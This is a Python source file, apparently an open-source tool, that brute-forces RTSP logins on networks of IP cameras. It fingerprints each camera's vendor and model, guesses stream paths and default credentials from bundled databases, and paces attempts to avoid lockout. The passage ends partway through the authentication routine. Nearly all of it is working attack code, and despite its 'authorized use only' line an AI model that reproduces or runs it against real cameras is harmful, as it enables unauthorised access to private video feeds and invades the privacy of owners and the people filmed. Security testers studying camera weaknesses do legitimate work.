#! /usr/bin/env python3
"""RTSP Brute Force — vendor/model-aware RTSP credential brute forcer.

Given a list of IP cameras (or a packet capture), it:

  1. Fast TCP reachability pre-check (offline hosts skipped instantly).
  2. Fingerprints each camera's vendor AND model (ONVIF when available, else
     RTSP/HTTP headers).
  3. Builds an ordered list of RTSP *routes* (stream paths + ports) for that
     vendor/model. When the camera speaks ONVIF, ``GetStreamUri`` yields the
     device's *exact* stream path(s), which go to the front of the list (turning
     path discovery from a guess into a fact). Behind those come the
     model-specific paths from the bundled scraped ispyconnect database
     (``data/cameras.csv``), then the vendor-wide paths, then a set of generic
     fall-back paths (including the bare ``rtsp://host:port`` root, which a few
     DVRs accept).
  4. Brute forces *credential-outer*: every host is prepared once (steps 1-3),
     then round 1 tries each host's first credential across the WHOLE fleet,
     round 2 the second, and so on. Because a given camera is touched only once
     per round — not hammered with its whole wordlist back-to-back — it gets time
     to cool down between attempts, which avoids the per-camera rate-limiting
     that costs cameras. Each attempt is a native RTSP ``DESCRIBE`` (no
     per-attempt FFmpeg process); a route-removed FFmpeg open is the last-resort
     fallback for cameras the native engine can't crack. Vendor default and
     ONVIF-accepted credentials are ordered first, so they land in round 1.

Concurrency uses a thread pool (RTSP/socket work is I/O-bound), not a process
pool — but the parallelism is now ACROSS cameras within a round, not one worker
draining a single camera. OpenCV is used for the optional frame capture on
success and for the route-removed FFmpeg fallback.

Authorized use only — operate cameras you own or have explicit permission to
access.
"""

import os

# Bound FFmpeg/RTSP connection + read time so the FFmpeg fallback / optional
# frame capture on a reachable-but-slow host doesn't hang a worker. Must be set
# before cv2 (and therefore FFmpeg) is imported.
#
# Transport is forced to TCP on purpose: with the bounded `stimeout` below, an
# auto-negotiated open tries UDP first and the timeout can fire before FFmpeg
# falls back to TCP, so UDP-lossy networks lose cameras (measured: forcing TCP
# cracked noticeably more of a real test set than auto+timeout).
os.environ.setdefault(
    "OPENCV_FFMPEG_CAPTURE_OPTIONS",
    "rtsp_transport;tcp|stimeout;5000000|timeout;5000000",
)
# Silence libavformat's own chatter (e.g. "method OPTIONS failed: 401") and
# OpenCV's VIDEOIO warnings emitted by the FFmpeg fallback on rejected
# credentials. Both must precede the cv2 import.
os.environ.setdefault("OPENCV_FFMPEG_LOGLEVEL", "-8")
os.environ.setdefault("OPENCV_LOG_LEVEL", "SILENT")

import re
import ssl
import csv
import socket
import random
import subprocess
import threading
from pickle import dump
from hashlib import md5
from pathlib import Path
from datetime import date
from base64 import b64decode, b64encode
from collections import namedtuple, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from optparse import OptionParser
from colorama import Fore, Style
from time import strftime, localtime, time, sleep

try:
    import yaml as _yaml  # type: ignore
    _HAS_YAML = True
except Exception:
    _HAS_YAML = False

# OpenCV is only needed for the optional frame capture on a successful login.
# The core brute-force engine is native RTSP, so the tool still runs without it.
try:
    import cv2  # type: ignore
    _HAS_CV2 = True
    try:
        cv2.setLogLevel(0)  # LOG_LEVEL_SILENT — no OpenCV VIDEOIO warnings
    except Exception:
        pass
except Exception:
    _HAS_CV2 = False

# tqdm draws the per-phase progress bar. Optional: without it the tool runs
# exactly as before, just without the bar.
try:
    from tqdm import tqdm  # type: ignore
    _HAS_TQDM = True
except Exception:
    _HAS_TQDM = False

# When a tqdm bar is active, per-host log lines must go through ``tqdm.write`` so
# they print above the bar instead of tearing it. Prepare/attempt work runs on
# worker threads, so writes to this are already serialised by ``lock`` in display().
_active_bar = None

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    message = f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}"
    if _active_bar is not None:
        _active_bar.write(message, end=end)
    else:
        print(message, end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        flags = [f for f in (arg[0], arg[1]) if f]
        parser.add_option(*flags, dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

lock = threading.Lock()
# RTSP brute forcing is I/O bound (socket + network waits), so oversubscribe the
# CPU count. Overridable with -t/--threads.
threads_number = min(64, (os.cpu_count() or 4) * 5)

verbose = True
capture_frame = False

SCRIPT_DIR = Path(__file__).resolve().parent
# Scraped default-credentials list (vendor -> default user/pass). Bundled under
# ./data so the tool is fully self-contained. Override with -d.
DEFAULT_CREDS_PATHS = [
    SCRIPT_DIR / "data" / "default_credentials.csv",
]
# Scraped camera database (vendor/model -> RTSP stream paths + ports). Bundled
# under ./data so the tool is fully self-contained. Override with -b. The data
# was originally scraped from ispyconnect.com; refresh it by re-scraping and
# dropping the CSVs into ./data.
CAMERA_DB_PATHS = [
    SCRIPT_DIR / "data" / "cameras.csv",
]
# YAML vendor knowledge base (banner signatures, vendor-specific paths and
# credentials in one file). Loaded alongside the CSV DB; entries here augment
# (not replace) the CSV data. Override with --vendor-db.
VENDOR_YAML_PATHS = [
    SCRIPT_DIR / "data" / "rtsp_vendors.yaml",
]

# Channels to try when expanding multi-channel RTSP path templates.
MULTI_CHANNELS = [1, 2, 3, 4, 101, 102, 201, 202]

# Substrings (lowercased) -> canonical vendor name. Matched against the RTSP/HTTP
# `Server` header, the 401 `WWW-Authenticate` realm and the HTML `<title>`.
# Kept in step with the scraped database's vendor names so a fingerprinted
# vendor lines up with its rows.
VENDOR_SIGNATURES = {
    "hikvision": "Hikvision", "dvrdvs": "Hikvision", "dnvrs-webs": "Hikvision",
    "dahua": "Dahua",
    "axis": "Axis",
    "amcrest": "Amcrest",
    "reolink": "Reolink",
    "foscam": "Foscam",
    "vivotek": "Vivotek",
    "mobotix": "Mobotix",
    "bosch": "Bosch",
    "samsung": "Samsung", "hanwha": "Hanwha",
    "sony": "Sony",
    "panasonic": "Panasonic",
    "ubiquiti": "Ubiquiti", "unifi": "Ubiquiti",
    "d-link": "D-Link", "dlink": "D-Link",
    "tp-link": "Tp-link", "tplink": "Tp-link", "tapo": "Tp-link",
    "trendnet": "Trendnet",
    "acti": "Acti",
    "geovision": "Geovision",
    "wyze": "Wyze",
    "lorex": "Lorex",
    "swann": "Swann",
    "uniview": "Uniview",
    "cp plus": "Cp Plus", "cpplus": "Cp Plus", "cp-plus": "Cp Plus",
    "hifocus": "Hifocus",
}

# Last-resort RTSP paths tried when the vendor/model is unknown, or appended
# after vendor/model routes. Ordered by real-world prevalence. The trailing
# "" / "/" preserve the old bare `rtsp://host:port` behaviour (a few DVRs
# stream at the root) as just another candidate route.
GENERIC_RTSP_PATHS = [
    "/Streaming/Channels/101",              # Hikvision & clones
    "/cam/realmonitor?channel=1&subtype=0",  # Dahua & clones
    "/h264/ch1/main/av_stream",
    "/live", "/live/ch0", "/live/ch00_0",
    "/onvif1", "/onvif-media/media.amp", "/axis-media/media.amp",
    "/11", "/stream1", "/video1", "/media/video1",
    "/user=[USERNAME]_password=[PASSWORD]_channel=1_stream=0.sdp",
    "/ISAPI/Streaming/Channels/101",
    "/", "",                                 # root / pathless (legacy behaviour)
]

# Generic credential pairs tried (with -a/--all-defaults) after the wordlist and
# any vendor-specific default, for cameras whose vendor isn't in the list.
# Ordered by real-world prevalence. Empty string = blank password.
COMMON_DEFAULTS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", ""),
    ("admin", "password"),
    ("root", "pass"),
    ("root", "root"),
    ("admin", "888888"),
]

# ONVIF is optional; when installed it yields both manufacturer AND model with
# high confidence. Without it we fall back to HTTP/RTSP header fingerprinting.
try:
    from onvif import ONVIFCamera  # type: ignore
    _HAS_ONVIF = True
except Exception:
    _HAS_ONVIF = False

ONVIF_PORTS = [80, 8000, 8899, 2020, 8080]

# Bounds for ONVIF stream-path discovery, so a big password list can't turn into
# a slow SOAP storm (or trip account lockout) and a many-channel NVR can't flood
# the route list with every channel. The first accepted credential wins; the
# first few profiles (channel 1 main/sub …) are the useful ones.
ONVIF_MAX_CRED_PROBES = 8
ONVIF_MAX_STREAM_ROUTES = 8

# Default port per protocol when a DB row reports port 0 ("unspecified").
DEFAULT_PORTS = {"rtsp": 554, "http": 80, "https": 443}

# Sensible defaults substituted for stream-parameter placeholders in scraped
# path templates.
_DEFAULT_TOKENS = {"CHANNEL": "1", "WIDTH": "1280", "HEIGHT": "720", "STREAM": "0"}


def normalize_key(value):
    """Lowercase-alphanumeric key for fuzzy vendor/model matching (e.g. 'D-Link'
    and 'D-link' both -> 'dlink')."""
    return re.sub(r"[^a-z0-9]", "", (value or "").lower())


def substitute(path, username, password, channel=1, width=1280, height=720):
    """Replace ``[TOKEN]`` placeholders in a scraped path template.

    Credentials placed inside the path/query string are URL-encoded here;
    credentials in the authority component are handled by the URL builder.
    """
    from urllib.parse import quote
    tokens = dict(_DEFAULT_TOKENS)
    tokens["CHANNEL"] = str(channel)
    tokens["WIDTH"] = str(width)
    tokens["HEIGHT"] = str(height)
    tokens["USERNAME"] = quote(username, safe="")
    tokens["PASSWORD"] = quote(password, safe="")
    # ``[AUTH]`` (e.g. ``...&authbasic=[AUTH]`` in some CP-Plus/Dahua templates)
    # is a base64 ``user:pass`` blob. Substituting it keeps the reported URL
    # valid; the actual login still rides the Digest ``Authorization`` header.
    tokens["AUTH"] = b64encode(f"{username}:{password}".encode()).decode()

    def repl(match):
        return tokens.get(match.group(1).upper(), match.group(0))

    return re.sub(r"\[([A-Za-z]+)\]", repl, path)


# --------------------------------------------------------------------------
# Scraped camera database (vendor/model -> RTSP routes; vendor -> default creds)
# --------------------------------------------------------------------------
TemplateRow = namedtuple("TemplateRow", "vendor model conn protocol port path")

_STREAM_CONNS = {"FFMPEG", "MJPEG", "VLC"}


class CameraDB:
    """Query layer over the scraped ispyconnect CSVs (RTSP rows only)."""

    def __init__(self):
        self._by_vendor = defaultdict(list)
        self._by_vendor_model = defaultdict(list)
        self._defaults = defaultdict(list)      # vendor key -> [(user, pass), ...]
        self._all_default_combos = []           # de-duped ordered list of all pairs
        self.template_count = 0

    @classmethod
    def load(cls, cameras_csv, creds_csv):
        db = cls()
        if cameras_csv and Path(cameras_csv).exists():
            with open(cameras_csv, newline="", encoding="utf-8") as f:
                for row in csv.DictReader(f):
                    if (row.get("protocol") or "").lower() != "rtsp":
                        continue
                    path = (row.get("url") or "").strip()
                    if not path:
                        continue
                    try:
                        port = int(row.get("port") or 0)
                    except ValueError:
                        port = 0
                    tr = TemplateRow(vendor=row.get("vendor", ""),
                                     model=row.get("model", ""),
                                     conn=(row.get("type") or "").upper(),
                                     protocol="rtsp", port=port, path=path)
                    vk = normalize_key(tr.vendor)
                    db._by_vendor[vk].append(tr)
                    db._by_vendor_model[(vk, normalize_key(tr.model))].append(tr)
                    db.template_count += 1
        if creds_csv and Path(creds_csv).exists():
            with open(creds_csv, newline="", encoding="utf-8") as f:
                for row in csv.DictReader(f):
                    key = normalize_key(row.get("vendor", ""))
                    pair = ((row.get("default_username") or "").strip(),
                            (row.get("default_password") or "").strip())
                    if key and pair not in db._defaults[key]:
                        db._defaults[key].append(pair)
                    if pair not in db._all_default_combos:
                        db._all_default_combos.append(pair)
        return db

    @property
    def vendor_count(self):
        return len(self._defaults)

    @staticmethod
    def _rank(rows):
        """Continuous-stream rows first (best for a live probe)."""
        return sorted(rows, key=lambda r: r.conn not in _STREAM_CONNS)

    def templates_for(self, vendor, model=None):
        """RTSP templates most-likely first: exact vendor+model, then vendor-wide
        (which includes the ``*`` wildcard rows). De-duped on (port, path)."""
        if not vendor:
            return []
        vk = normalize_key(vendor)
        ordered = []
        if model:
            ordered.extend(self._by_vendor_model.get((vk, normalize_key(model)), []))
        ordered.extend(self._by_vendor.get(vk, []))
        result, seen = [], set()
        for r in self._rank(ordered):
            key = (r.port, r.path)
            if key not in seen:
                seen.add(key)
                result.append(r)
        return result

    def rtsp_routes(self, vendor, model, host_port, cap):
        """Ordered ``(path, port)`` route candidates for one host: vendor/model
        templates first, then the generic fall-back paths."""
        host_port = host_port or DEFAULT_PORTS["rtsp"]
        routes, seen = [], set()

        def add(path, port):
            key = (path, port)
            if key not in seen:
                seen.add(key)
                routes.append((path, port))

        for tr in self.templates_for(vendor, model):
            add(tr.path, tr.port or host_port)
        for path in GENERIC_RTSP_PATHS:
            add(path, host_port)
        if cap and cap > 0:
            routes = routes[:cap]
        return routes

    def default_creds_for(self, vendor):
        """Vendor-specific default credential pairs (empty if vendor unknown)."""
        return list(self._defaults.get(normalize_key(vendor), [])) if vendor else []

    def all_default_combos(self):
        return list(self._all_default_combos)


def resolve_path(explicit, candidates):
    """Pick a data file: an explicit path if it exists, else the first existing
    bundled candidate under ./data."""
    if explicit:
        return explicit if Path(explicit).exists() else None
    for candidate in candidates:
        if Path(candidate).exists():
            return str(candidate)
    return None


# --------------------------------------------------------------------------
# YAML vendor knowledge base
# --------------------------------------------------------------------------
class VendorKB:
    """Vendor-specific RTSP paths, credentials and banner signatures loaded
    from a YAML knowledge base file (``data/rtsp_vendors.yaml``).

    The YAML schema::

        vendors:
          - name: Hikvision
            banners: ["Hikvision-Webs", "DVRDVS-Webs", "DNVRS-Webs"]
            paths: ["/Streaming/Channels/101", "/h264/ch1/main/av_stream"]
            creds:
              - ["admin", "12345"]
              - ["admin", ""]

    ``banners`` are substrings matched (case-insensitive) against the raw RTSP
    ``Server`` header, providing a second-chance identification for cameras
    whose banner isn't in the hardcoded ``VENDOR_SIGNATURES``.
    """

    def __init__(self):
        self._by_banner = []       # [(lowercase_substr, vendor_name), ...]
        self._paths = defaultdict(list)   # vendor key -> [path, ...]
        self._creds = defaultdict(list)   # vendor key -> [(user, pass), ...]
        self.vendor_count = 0

    @classmethod
    def load(cls, yaml_path):
        kb = cls()
        if not yaml_path or not Path(yaml_path).exists():
            return kb
        if not _HAS_YAML:
            return kb
        try:
            with open(yaml_path, encoding="utf-8") as f:
                data = _yaml.safe_load(f)
        except Exception:
            return kb
        if not isinstance(data, dict):
            return kb
        for entry in data.get("vendors", []):
            name = (entry.get("name") or "").strip()
            if not name:
                continue
            vk = normalize_key(name)
            kb.vendor_count += 1
            for b in entry.get("banners", []):
                if b:
                    kb._by_banner.append((b.lower(), name))
            for p in entry.get("paths", []):
                if p and p not in kb._paths[vk]:
                    kb._paths[vk].append(p)
            for c in entry.get("creds", []):
                if isinstance(c, (list, tuple)) and len(c) >= 2:
                    pair = (str(c[0]), str(c[1]))
                    if pair not in kb._creds[vk]:
                        kb._creds[vk].append(pair)
        return kb

    def identify_vendor(self, banner):
        """Match a raw RTSP ``Server`` banner against the KB's banner list."""
        if not banner:
            return None
        low = banner.lower()
        for substr, name in self._by_banner:
            if substr in low:
                return name
        return None

    def paths_for(self, vendor):
        return list(self._paths.get(normalize_key(vendor), []))

    def creds_for(self, vendor):
        return list(self._creds.get(normalize_key(vendor), []))


# --------------------------------------------------------------------------
# Multi-channel expansion
# --------------------------------------------------------------------------
_CHANNEL_PLACEHOLDER_RE = re.compile(r"\[CHANNEL\]|\{channel\}", re.I)
_CHANNEL_PARAM_RE = re.compile(
    r"(channel=|chID=|cam=|camera=|trackID=)(\d+)", re.I)


def is_multichannel_path(path):
    """True if the path contains a channel placeholder or a channel parameter."""
    if _CHANNEL_PLACEHOLDER_RE.search(path):
        return True
    return bool(_CHANNEL_PARAM_RE.search(path))


def expand_channels(path, channels=None):
    """Expand a single path into one variant per channel.

    Handles both ``[CHANNEL]``/``{channel}`` template placeholders and
    concrete ``channel=N`` / ``chID=N`` / ``cam=N`` query parameters.
    Returns a list of (expanded_path, channel_number) tuples. Paths without
    a channel marker are returned as-is with channel 1.
    """
    if channels is None:
        channels = MULTI_CHANNELS
    # Template placeholder
    if _CHANNEL_PLACEHOLDER_RE.search(path):
        results = []
        for ch in channels:
            expanded = _CHANNEL_PLACEHOLDER_RE.sub(str(ch), path)
            results.append((expanded, ch))
        return results
    # Concrete parameter (e.g. channel=1) — replace the number
    m = _CHANNEL_PARAM_RE.search(path)
    if m:
        results = []
        for ch in channels:
            expanded = path[:m.start(2)] + str(ch) + path[m.end(2):]
            results.append((expanded, ch))
        return results
    return [(path, 1)]


# --------------------------------------------------------------------------
# ffprobe fallback
# --------------------------------------------------------------------------
def ffprobe_check(url, timeout=6):
    """Validate an RTSP URL via ``ffprobe`` (part of FFmpeg). Returns True if
    the stream is reachable and at least one media track is found.

    Unlike the cv2-based FFmpeg fallback, this needs no OpenCV and runs as a
    lightweight subprocess. It is used as an extra validation step after a
    native ``DESCRIBE`` success, and as a fallback login method for cameras
    that the cv2 path can't reach (e.g. when OpenCV is not installed).
    """
    try:
        result = subprocess.run(
            ["ffprobe", "-v", "error", "-rtsp_transport", "tcp",
             "-timeout", str(int(timeout * 1_000_000)),
             "-i", url, "-show_entries", "stream=index"],
            capture_output=True, timeout=timeout + 5)
    except FileNotFoundError:
        return False
    except subprocess.TimeoutExpired:
        return False
    if result.returncode != 0:
        stderr = result.stderr.decode("latin-1", "replace").lower()
        if "401" in stderr or "unauthorized" in stderr:
            return False
        return False
    stdout = result.stdout.decode("latin-1", "replace")
    return "index=" in stdout


def ffprobe_attempt(host, port, cred, tls=False, timeout=6):
    """Try ONE credential via ffprobe. Returns a result dict on success."""
    from urllib.parse import quote
    user, password = cred
    if user or password:
        auth = f"{quote(user or '', safe='')}:{quote(password or '', safe='')}@"
    else:
        auth = ""
    scheme = "rtsps" if tls else "rtsp"
    url = f"{scheme}://{auth}{host}:{port}"
    if ffprobe_check(url, timeout):
        return {"user": user, "password": password, "url": url, "ffprobe": True}
    return None


# --------------------------------------------------------------------------
# Target parsing / reachability
# --------------------------------------------------------------------------
def parse_target(target):
    """Split a target into ``(host, http_port, rtsp_port, tls)``.

    Accepts a bare IP/host, ``host:rtsp_port`` or ``[v6]:rtsp_port``, optionally
    with an ``rtsp://`` or ``rtsps://`` scheme (and an ignored trailing path).
    ``tls`` is True for ``rtsps://``, False for an explicit ``rtsp://``, and None
    for a bare target (meaning "decide later" — global flag or auto-detect).
    ``rtsps://`` with no explicit port defaults to 322 (the IANA RTSPS port)
    instead of 554. The HTTP port is left at 80 (fingerprinting only)."""
    target = target.strip()
    tls = None
    lowered = target.lower()
    if lowered.startswith("rtsps://"):
        tls, target = True, target[len("rtsps://"):]
    elif lowered.startswith("rtsp://"):
        tls, target = False, target[len("rtsp://"):]
    target = target.split("/", 1)[0]                 # drop any trailing path
    host, http_port, rtsp_port = target, 80, (322 if tls else 554)
    if target.startswith('['):  # bracketed IPv6, optional :port
        end = target.find(']')
        if end != -1:
            host = target[1:end]
            rest = target[end + 1:]
            if rest.startswith(':') and rest[1:].isdigit():
                rtsp_port = int(rest[1:])
    elif target.count(':') == 1:  # host:port (bare IPv6 has multiple colons)
        head, _, tail = target.rpartition(':')
        if tail.isdigit():
            host, rtsp_port = head, int(tail)
    return host, http_port, rtsp_port, tls


def tcp_reachable(host, ports, timeout):
    """True if a TCP connection succeeds on any of ``ports`` within ``timeout``."""
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            continue
    return False


# --------------------------------------------------------------------------
# Fingerprinting
# --------------------------------------------------------------------------
def _header_value(raw, name):
    match = re.search(rf"(?im)^{re.escape(name)}:\s*(.+)$", raw)
    return match.group(1).strip() if match else ""


def _match_signature(*texts):
    blob = " ".join(text.lower() for text in texts if text)
    for needle, vendor in VENDOR_SIGNATURES.items():
        if needle in blob:
            return vendor
    return None


def _http_fingerprint(host, port, timeout):
    """Return a vendor guess from the HTTP `Server` header / 401 realm / title."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            request = (f"GET / HTTP/1.0\r\nHost: {host}\r\n"
                       f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
                       f"Connection: close\r\n\r\n")
            sock.sendall(request.encode())
            chunks, total = [], 0
            while total < 65536:
                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
                total += len(data)
        raw = b"".join(chunks).decode("latin-1", "replace")
    except OSError:
        return None
    title_match = re.search(r"<title>(.*?)</title>", raw, re.I | re.S)
    title = title_match.group(1).strip() if title_match else ""
    return _match_signature(_header_value(raw, "Server"),
                            _header_value(raw, "WWW-Authenticate"), title)


def _rtsp_fingerprint(host, port, timeout, tls=False):
    """Return ``(vendor, banner)`` from the RTSP OPTIONS ``Server`` header.

    ``banner`` is the raw Server string (e.g. ``"Hikvision-Webs"``);
    ``vendor`` is the canonical name matched via ``VENDOR_SIGNATURES`` (or
    via the YAML knowledge-base banner list when the hardcoded dict misses).
    Either may be None.
    """
    sock = _open(host, port, timeout, tls)
    if sock is None:
        return None, None
    try:
        scheme = "rtsps" if tls else "rtsp"
        request = (f"OPTIONS {scheme}://{host}:{port} RTSP/1.0\r\n"
                   f"CSeq: 1\r\nUser-Agent: RTSP-Brute-Force\r\n\r\n")
        sock.sendall(request.encode())
        raw = sock.recv(2048).decode("latin-1", "replace")
    except OSError:
        return None, None
    finally:
        try:
            sock.close()
        except OSError:
            pass
    banner = _header_value(raw, "Server") or None
    vendor = _match_signature(banner) if banner else None
    return vendor, banner


def _onvif_fingerprint(host, http_port, username, password, timeout):
    """Return ``(vendor, model)`` via ONVIF GetDeviceInformation, or (None, None)."""
    if not _HAS_ONVIF:
        return None, None
    for port in ([http_port] if http_port else []) + ONVIF_PORTS:
        try:
            device = ONVIFCamera(host, port, username, password)
            info = device.devicemgmt.GetDeviceInformation()
            vendor = (info.Manufacturer or "").strip() or None
            model = (info.Model or "").strip() or None
            if vendor or model:
                return vendor, model
        except Exception:
            continue
    return None, None


def _parse_stream_uri(uri, host, default_port):
    """Turn an ONVIF GetStreamUri result into a ``(path, port)`` route.

    The path/query is taken verbatim (it is the device's authoritative stream
    path), but rebuilt against the *target* host: some cameras report an internal
    hostname or 0.0.0.0 in the URI, which would be unreachable."""
    from urllib.parse import urlsplit
    parts = urlsplit(uri)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    try:
        port = parts.port or default_port
    except ValueError:
        port = default_port
    return path, port


def onvif_stream_routes(host, http_port, rtsp_port, creds, timeout):
    """Ask the camera, via ONVIF ``GetStreamUri``, for its exact RTSP stream paths.

    Returns ``(routes, working_cred)``: ``routes`` is an ordered list of
    ``(path, port)`` taken straight from the device's media profiles, and
    ``working_cred`` is the first credential ONVIF accepted (a good bet to try
    first at the RTSP layer). Returns ``([], None)`` when ONVIF is unavailable,
    no port answers, or no supplied credential is accepted.
    """
    if not _HAS_ONVIF:
        return [], None
    ports = [http_port] + [p for p in ONVIF_PORTS if p != http_port]
    attempts = 0
    for port in ports:
        if timeout and not tcp_reachable(host, [port], timeout):
            continue                     # no service here — don't hang on it
        speaks_onvif = False
        for user, password in creds:
            if attempts >= ONVIF_MAX_CRED_PROBES:
                return [], None
            attempts += 1
            try:
                cam = ONVIFCamera(host, port, user or "", password or "")
                media = cam.create_media_service()
                profiles = media.GetProfiles()
                routes, seen = [], set()
                for profile in profiles:
                    try:
                        request = media.create_type("GetStreamUri")
                        request.ProfileToken = profile.token
                        request.StreamSetup = {"Stream": "RTP-Unicast",
                                               "Transport": {"Protocol": "RTSP"}}
                        uri = getattr(media.GetStreamUri(request), "Uri", "") or ""
                    except Exception:
                        continue
                    if not uri:
                        continue
                    route = _parse_stream_uri(uri, host, rtsp_port)
                    if route not in seen:
                        seen.add(route)
                        routes.append(route)
                    if len(routes) >= ONVIF_MAX_STREAM_ROUTES:
                        break
                if routes:
                    return routes, (user, password)
            except Exception as exc:
                # A SOAP fault (or an auth-rejection message) means the port
                # speaks ONVIF but this credential was rejected — try the next
                # credential. A transport/parse error before ONVIF ever answered
                # means there's no ONVIF service here — move to the next port.
                blob = f"{type(exc).__name__} {exc}".lower()
                if "fault" in blob or "auth" in blob or "not authorized" in blob:
                    speaks_onvif = True
                if speaks_onvif:
                    continue
                break
    return [], None


def fingerprint(host, http_port, rtsp_port, username, password, timeout, tls=False):
    """Identify a camera's ``(vendor, model, banner)`` best-signal-first.

    ONVIF (vendor + model) -> HTTP headers (vendor) -> RTSP OPTIONS (vendor +
    raw banner). The RTSP banner is always collected when the OPTIONS probe
    runs (even if ONVIF/HTTP already found the vendor) and returned for
    display and YAML-KB matching.
    """
    vendor, model = _onvif_fingerprint(host, http_port, username, password, timeout)
    if vendor is None:
        vendor = _http_fingerprint(host, http_port, timeout)
    rtsp_vendor, banner = _rtsp_fingerprint(host, rtsp_port, timeout, tls)
    if vendor is None:
        vendor = rtsp_vendor
    return vendor, model, banner


# --------------------------------------------------------------------------
# Native RTSP DESCRIBE engine
# --------------------------------------------------------------------------
def _www_field(www, name):
    """Extract a field value from a WWW-Authenticate header (quoted or bare)."""
    match = (re.search(name + r'\s*=\s*"([^"]*)"', www, re.I)
             or re.search(name + r'\s*=\s*([^,\s]+)', www, re.I))
    return match.group(1) if match else ""


def _digest_auth_header(www, user, password, method, uri):
    """Build a Digest ``Authorization`` value, with qop=auth support."""
    realm = _www_field(www, "realm")
    nonce = _www_field(www, "nonce")
    qop = _www_field(www, "qop")
    opaque = _www_field(www, "opaque")
    ha1 = md5(f"{user}:{realm}:{password}".encode()).hexdigest()
    ha2 = md5(f"{method}:{uri}".encode()).hexdigest()
    parts = [f'username="{user}"', f'realm="{realm}"', f'nonce="{nonce}"',
             f'uri="{uri}"']
    if qop and "auth" in qop.lower():
        nc = "00000001"
        cnonce = md5(f"{nonce}:{user}:{uri}".encode()).hexdigest()[:16]
        response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}".encode()).hexdigest()
        parts += [f'response="{response}"', "qop=auth", f"nc={nc}",
                  f'cnonce="{cnonce}"']
    else:
        response = md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
        parts.append(f'response="{response}"')
    if opaque:
        parts.append(f'opaque="{opaque}"')
    return "Digest " + ", ".join(parts)


def _auth_header(www, user, password, method, uri):
    low = www.lower().strip()
    if low.startswith("digest"):
        return _digest_auth_header(www, user, password, method, uri)
    if low.startswith("basic"):
        return "Basic " + b64encode(f"{user}:{password}".encode()).decode()
    return ""


# Reused TLS context for RTSPS: cameras almost always present self-signed certs,
# so verification is disabled (we're attacking the box, not trusting it).
_TLS_CTX = ssl.create_default_context()
_TLS_CTX.check_hostname = False
_TLS_CTX.verify_mode = ssl.CERT_NONE


def _open(host, port, timeout, tls=False):
    """Open one RTSP connection, or return None on failure. When ``tls`` is set,
    the socket is wrapped in TLS for RTSPS (``rtsps://``)."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        if tls:
            sock = _TLS_CTX.wrap_socket(sock, server_hostname=host)
        return sock
    except Exception:
        return None


def detect_tls(host, port, timeout):
    """Decide whether ``port`` speaks plaintext RTSP or RTSPS. Returns True for
    TLS, False for plaintext / unknown.

    Plaintext-first for speed: a real RTSP server answers a plaintext ``OPTIONS``
    with ``RTSP/...`` immediately, so plaintext cameras are settled in one round
    trip (a TLS handshake against them would instead hang until timeout). Only
    when the plaintext probe yields no RTSP reply do we attempt a TLS handshake."""
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        raw.settimeout(timeout)
        raw.sendall(f"OPTIONS rtsp://{host}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
        data = raw.recv(256)
        raw.close()
        if data[:5] == b"RTSP/":
            return False
    except OSError:
        pass
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        raw.settimeout(timeout)
        _TLS_CTX.wrap_socket(raw, server_hostname=host).close()
        return True
    except Exception:
        try:
            raw.close()
        except Exception:
            pass
        return False


def _send_describe(sock, uri, cseq, auth=None):
    """Send one RTSP DESCRIBE on an already-open socket; return ``(code, headers)``.

    ``code`` is None on a socket error. The socket is left open so a Digest
    challenge and its authenticated reply can be exchanged over the SAME
    connection — mandatory for cameras (Dahua/CP-Plus and their many clones)
    whose nonce/realm is bound to the TCP connection and is invalid on any other.
    """
    lines = [f"DESCRIBE {uri} RTSP/1.0", f"CSeq: {cseq}",
             "User-Agent: RTSP-Brute-Force", "Accept: application/sdp"]
    if auth:
        lines.append(f"Authorization: {auth}")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    try:
        sock.sendall(request)
        raw = b""
        while b"\r\n\r\n" not in raw and len(raw) < 8192:
            try:
                chunk = sock.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            raw += chunk
    except OSError:
        return None, {}
    text = raw.decode("latin-1", "replace")
    parts = text.split("\r\n", 1)[0].split()
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else None
    headers = {}
    for line in text.split("\r\n")[1:]:
        if ":" in line:
            key, _, value = line.partition(":")
            headers[key.strip().lower()] = value.strip()
    return code, headers


def _describe_unauth(host, port, uri, timeout, tls=False):
    """One unauthenticated DESCRIBE on its own connection. Returns ``(code, www)``."""
    sock = _open(host, port, timeout, tls)
    if sock is None:
        return None, ""
    try:
        code, headers = _send_describe(sock, uri, 1)
        return code, headers.get("www-authenticate", "")
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _describe_auth(host, port, uri, user, password, timeout, tls=False):
    """Full authenticated DESCRIBE over ONE connection: fetch the challenge and
    send the credentialed reply on the same socket. Returns the final status
    code (None on a socket error).

    A single shared connection is mandatory: these cameras mint a fresh,
    connection-bound Digest nonce/realm on every TCP connection, so a challenge
    fetched on one socket can never be answered on another.
    """
    sock = _open(host, port, timeout, tls)
    if sock is None:
        return None
    try:
        code, headers = _send_describe(sock, uri, 1)
        if code not in (401, 403):          # 200 open, or 404/None -> decisive
            return code
        www = headers.get("www-authenticate", "")
